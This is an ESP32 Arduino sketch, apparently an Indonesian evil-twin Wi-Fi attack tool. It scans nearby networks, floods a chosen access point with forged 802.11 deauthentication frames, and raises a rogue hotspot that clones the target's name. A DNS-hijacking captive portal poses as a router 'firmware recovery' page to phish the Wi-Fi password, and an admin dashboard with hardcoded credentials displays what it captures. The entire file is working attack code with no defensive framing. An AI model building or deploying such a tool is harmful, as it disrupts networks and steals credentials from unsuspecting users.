#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

const int LED_PIN = 2;              
const char* ADMIN_SSID = "GMpro";   
const char* ADMIN_PASS = "Sangkur87"; 
const byte DNS_PORT = 53;

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

_Network _networks[16];
_Network _selectedNetwork;
WebServer webServer(80);
DNSServer dnsServer;

String _correct = "";
String _tryPassword = "";
bool deauthing_active = false;
bool hotspot_active = false;
unsigned long last_deauth_time = 0;

// --- TOOLS ---
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

void sendDeauthFrame(uint8_t* bssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&packet[10], bssid, 6);
  memcpy(&packet[16], bssid, 6);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

void performManualScan() {
  WiFi.scanDelete(); 
  int n = WiFi.scanNetworks(false, false, false, 100); 
  if (n > 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
  }
}

// --- HALAMAN WEB ---
void handleIndex() {
  String hostHeader = webServer.header("Host");
  
  // 1. JEBAKAN BAHASA INDONESIA (CAPTIVE PORTAL)
  if (hotspot_active && !hostHeader.equalsIgnoreCase("192.168.4.1") && hostHeader != "") {
      String a = _selectedNetwork.ssid;
      String html = "<!DOCTYPE html><html><head><title>Sistem Pemulihan</title><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
      html += "body{color:#333;font-family:sans-serif;margin:0;background:#f2f2f2;}";
      html += "nav{background:#0066ff;color:#fff;padding:1.3em;font-weight:bold;font-size:1.1em;}";
      html += "article{padding:20px;} h1{color:#e60000;font-size:1.4em;} .box{background:#fff;padding:15px;border-radius:8px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}";
      html += "input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:5px;box-sizing:border-box;}";
      html += "button{background:#0066ff;color:#fff;border:none;width:100%;padding:15px;border-radius:5px;font-weight:bold;cursor:pointer;}";
      html += "</style></head><body><nav>" + a + " - Pusat Pemulihan</nav><article><div class='box'>";
      html += "<h1>⚠️ Gagal Memperbarui Firmware</h1><p>Router mengalami masalah saat menginstal pembaruan sistem otomatis.</p>";
      html += "<p>Untuk mengembalikan fungsi internet dan memulihkan sistem, silakan masukkan kata sandi WiFi Anda di bawah ini:</p>";
      html += "<form action='/' method='get'><label>Kata Sandi WiFi:</label><input type='password' name='pass' minlength='8' placeholder='Masukkan password WiFi' required>";
      html += "<button type='submit'>PULIHKAN SEKARANG</button></form></div></article></body></html>";
      webServer.send(200, "text/html", html);
      return;
  }

  // 2. LOGIKA ADMIN
  if (webServer.hasArg("pass")) {
    _tryPassword = webServer.arg("pass");
    webServer.send(200, "text/html", "<!DOCTYPE html><html><body style='text-align:center;padding-top:50px;font-family:sans-serif;background:#f2f2f2;'><h2>Sedang memverifikasi sistem...</h2><p>Mohon tunggu 1-2 menit. Jangan tutup halaman ini.</p><progress></progress></body></html>");
    return;
  }

  if (webServer.hasArg("sel")) _selectedNetwork = _networks[webServer.arg("sel").toInt()];
  
  if (webServer.hasArg("action")) {
    String a = webServer.arg("action");
    if (a == "scan") performManualScan();
    if (a == "deauth_on") deauthing_active = true;
    if (a == "deauth_off") deauthing_active = false;
    if (a == "hotspot_on") { hotspot_active = true; WiFi.softAP(_selectedNetwork.ssid.c_str()); }
    if (a == "hotspot_off") { hotspot_active = false; WiFi.softAP(ADMIN_SSID, ADMIN_PASS); }
  }

  // 3. DASHBOARD ADMIN (DARK MODE)
  String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>";
  h += "body{font-family:monospace;background:#050505;color:#00ff41;padding:15px;}";
  h += ".card{max-width:500px;margin:auto;background:#111;padding:15px;border:1px solid #00ff41;border-radius:10px;}";
  h += ".btn{display:inline-block;padding:10px;border-radius:5px;text-decoration:none;font-weight:bold;margin:5px 2px;text-align:center;min-width:100px;font-size:12px;}";
  h += ".b-on{background:#00ff41;color:#000;} .b-off{background:#ff3131;color:#fff;} .b-scan{background:#ffcc00;color:#000;width:95%;}";
  h += "table{width:100%;margin-top:20px;border-collapse:collapse;font-size:12px;} td,th{padding:10px;border-bottom:1px solid #222;text-align:left;}";
  h += "</style></head><body><div class='card'><h2>GMPRO HYBRID INDO</h2>";
  
  if (_correct != "") h += "<div style='background:#00ff41;color:#000;padding:10px;margin-bottom:10px;font-weight:bold;'>" + _correct + "</div>";
  
  h += "TARGET: " + (_selectedNetwork.ssid == "" ? "KOSONG" : _selectedNetwork.ssid) + "<br>";
  h += "STATUS: " + String(deauthing_active ? "MENYERANG" : "DIAM") + "<br><br>";
  
  h += "<a href='/?action=scan' class='btn b-scan'>SCAN ULANG</a><br>";
  h += "<a href='/?action=deauth_on' class='btn b-on'>DEAUTH ON</a><a href='/?action=deauth_off' class='btn b-off'>DEAUTH OFF</a><br>";
  h += "<a href='/?action=hotspot_on' class='btn b-on'>EVIL ON</a><a href='/?action=hotspot_off' class='btn b-off'>EVIL OFF</a>";
  
  h += "<table><tr><th>SSID</th><th>CH</th><th>AKSI</th></tr>";
  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") continue;
    h += "<tr><td>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td>";
    h += "<td><a href='/?sel=" + String(i) + "' style='color:#ffcc00;'>PILIH</a></td></tr>";
  }
  h += "</table></div></body></html>";
  webServer.send(200, "text/html", h);
}

void setup() {
  Serial.begin(115200);
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true);
  delay(1000);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ADMIN_SSID, ADMIN_PASS, 6, 0, 4);
  delay(1000); 
  
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_ps(WIFI_PS_NONE); 

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  const char * headerkeys[] = {"Host"} ;
  webServer.collectHeaders(headerkeys, 1);
  
  webServer.on("/", handleIndex);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  Serial.println("GMpro Hybrid Indo Ready!");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (_tryPassword != "") {
    _correct = "DAPET! SSID: " + _selectedNetwork.ssid + " | PASS: " + _tryPassword;
    Serial.println(_correct);
    _tryPassword = ""; 
    // Indikator LED berkedip saat dapat password
    for(int i=0; i<10; i++){ digitalWrite(LED_PIN, HIGH); delay(100); digitalWrite(LED_PIN, LOW); delay(100); }
  }

  if (deauthing_active && _selectedNetwork.ssid != "") {
    if (millis() - last_deauth_time > 150) { 
      sendDeauthFrame(_selectedNetwork.bssid, _selectedNetwork.ch);
      last_deauth_time = millis();
    }
  }
}
